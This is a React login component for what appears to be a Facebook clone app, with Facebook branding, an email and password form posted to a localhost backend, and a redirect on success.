// components/Signup.js
import React, { useState } from "react";
import { Link, useNavigate } from "react-router-dom";

const Login = () => {
  const navigate = useNavigate("");
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });
  const [error, setError] = useState("");
  const [successMessage, setSuccessMessage] = useState("");

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await fetch("http://localhost:4000/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      const data = await response.json();
      if (!response.ok) {
        throw new Error(data.message);
      }

      setSuccessMessage(data.message);
      setTimeout(() => {
        navigate("/facebook");
      }, 2000); // Redirect after 2 seconds
      setError("");
    } catch (error) {
      console.error("Error logging in:", error.message);
      setError(error.message);
      setSuccessMessage("");
    }
  };
  return (
    <div className="min-h-screen flex flex-col justify-center bg-gray-100 sm:px-6 lg:px-16">
      <div className="mx-auto w-64">
        <img
          src="https://logos-world.net/wp-content/uploads/2020/04/Facebook-Logo.png"
          alt=""
          srcset=""
        />
      </div>

      <div className="mx-auto text-xl py-5">
        {error && <p style={{ color: "red" }}>{error}</p>}
        {successMessage && <p style={{ color: "green" }}>{successMessage}</p>}
      </div>
      <div className="bg-white lg:w-96  shadow-lg lg:mx-auto mx-auto  sm:justify-center rounded-md   py-2 px-16">
        <form className="space-y-6" onSubmit={handleSubmit}>
          <h2 className="text-center font-extralight text-lg">
            Log In to Facebook
          </h2>
          <div>
            <input
              placeholder="Enter Email"
              type="email"
              name="email"
              id="email"
              value={formData.email}
              onChange={handleChange}
              autoComplete="email"
              required
              className="mt-1 p-2 border border-gray-300 block w-full rounded-md"
            />
          </div>
          <div>
            <input
              placeholder="Enter Password"
              type="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              id="password"
              autoComplete="password"
              required
              className="mt-1 p-2 border border-gray-300 block w-full rounded-md"
            />
          </div>
          {/* Add more form fields as needed */}
          <div>
            <button
              type="submit"
              className="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-base font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
            >
              Log In
            </button>
          </div>
          <div className="text-center text-blue-500 hover:underline">
            <a href="#">Forgotten password?</a>
          </div>
          <hr />
          <div className="grid justify-center">
            <button
              type="submit"
              className="py-3 px-4 border border-transparent rounded-md shadow-sm text-base font-medium text-white bg-green-500 hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500"
            >
              <Link to="/signup">create an account</Link>
            </button>
          </div>
        </form>
      </div>

      <br />
    </div>
  );
};

export default Login;
